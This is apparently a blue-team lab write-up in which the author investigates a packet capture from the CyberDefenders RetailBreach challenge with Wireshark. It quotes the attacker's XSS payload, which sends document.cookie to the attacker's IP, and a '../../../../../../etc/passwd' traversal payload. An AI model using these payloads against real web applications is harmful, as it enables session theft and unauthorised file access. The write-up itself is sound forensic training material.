# RetailBreach - PCAP Analysis (CyberDefenders)

## Scenario
In recent days, ShopSphere, a prominent online retail platform, has experienced unusual administrative login activity during late-night hours.
These logins coincide with an influx of customer complaints about unexplained account anomalies, raising concerns about a potential security breach.
Initial observations suggest unauthorized access to administrative accounts, potentially indicating deeper system compromise.

Your mission is to investigate the captured network traffic to determine the nature and source of the breach.
Identifying how the attackers infiltrated the system and pinpointing their methods will be critical to understanding the attack's scope and mitigating its impact.

## References
- https://cyberdefenders.org/blueteam-ctf-challenges/retailbreach/

> [!IMPORTANT]
> The questions below are not in the original lab order. I arranged them in the order that best matched my investigation flow.

### Q1 - What is the attacker's IP address?

I first checked **Statistics → Conversations**, but that alone is obviously not enough to identify the attacker for real.
Then I used the filter shown in the screenshot, and, as usual, these damn exercises kind of want you to do that.

<img width="324" height="94" alt="immagine" src="https://github.com/user-attachments/assets/4b13ca56-9406-456a-b90b-58f4b7bfdf34" />

<img width="1123" height="255" alt="immagine" src="https://github.com/user-attachments/assets/5d86033e-031b-4ca6-ab94-2a1933cde162" />

Not only did it lead me to the actual **POST** that also contains the answer to another question, but in a small dataset like this it was already enough to make **`111.224.180.128`** stand out as the attacker’s IP. 
The reason is that you can directly see that script there, with **`fetch`** and **`document.cookie`** written in plain sight. 
A script like that is already enough to make the activity clearly malicious.

**Answer:** `111.224.180.128`

### Q3 - Can you specify the XSS payload that the attacker used to compromise the integrity of the web application?

To answer this question, just look at the screenshot above.
The payload is shown directly there in the parameter value,

**Answer:** `<script>fetch('http://111.224.180.128/' + document.cookie);</script>`

### Q2 - Which tool did the attacker use to perform the brute-forcing?

Here I just scrolled through the brute-force attempts and checked one of those requests more closely. 
Once I opened it, the answer was straightforward, because the **User-Agent** was shown directly in the HTTP details.
So there was no need to overcomplicate it: I just read the tool name from there, and it was **`gobuster`**.

<img width="900" height="506" alt="immagine" src="https://github.com/user-attachments/assets/81624bd7-7c9f-41d6-ae94-2104143d9c14" />

**Answer:** `gobuster`


### Q4 - Can you provide the UTC timestamp when the admin user first visited the page containing the injected malicious script?

Before this question, I changed the time display format to make the timestamp easier to read, which can be done through **View → Time Display Format**.
After that, going back to the **HTTP** filter, I could see the packet where the attacker had injected the script and then the later activity involving the admin login.
In this context, that was enough to identify the relevant moment for **Q4**, because the traffic shows the compromised page already in play and the admin-related access happening afterward. So the timestamp visible there is the one used for the answer.

<img width="1249" height="550" alt="immagine" src="https://github.com/user-attachments/assets/9baabc68-0cc6-45c2-814a-6824d3b57f88" />

**Answer:** `2024-03-29 12:09`

### Q5 - Can you provide the session token that the attacker acquired and used for this unauthorized access?

For this question, it was enough to refer back to the previous screenshot and inspect the cookie in its proper location. 
In the packet details, under **Hypertext Transfer Protocol**, the value is shown in the **`Cookie`** header, and Wireshark also breaks it out as a **cookie pair** immediately below.

**Answer:** `lqkctf24s9h9lg67teu8uevn3q`

### Q6 - What is the name of the script that was exploited by the attacker?

For the last two questions, there was no real need to filter any further, because the traffic was already fairly clean and there was not much noise left. 
We could have narrowed it down to just the **admin**-related requests, but even without doing that, the relevant packets were already visible near the end of the capture. 
At that point, one request clearly stood out because it matched the kind of activity the questions were asking about, so to avoid guessing I followed the stream for confirmation.

<img width="1479" height="154" alt="immagine" src="https://github.com/user-attachments/assets/8dc56eff-ec01-4b0f-8583-ec3056c6b835" />

Once the **Follow TCP Stream** output is opened, the situation becomes clear. 
The request is made to **`/admin/log_viewer.php`**, which directly answers the question about the exploited script.

<img width="907" height="1043" alt="immagine" src="https://github.com/user-attachments/assets/6e30406d-ec9d-49e4-a3a6-208f1ccf7270" />

**Answer:** `log_viewer.php`

### Q7 - Can you identify the specific payload that the attacker used to access a sensitive system file?

In the same screenshot, we can observe that the **`file`** parameter contains **`../../../../../../etc/passwd`**, which directly answers the question about the payload used to access a sensitive system file. 
The stream removes any ambiguity, because it not only shows the crafted request in full, but also the returned contents of **`/etc/passwd`**, confirming that the traversal payload actually worked.

**Answer:** `../../../../../../etc/passwd`
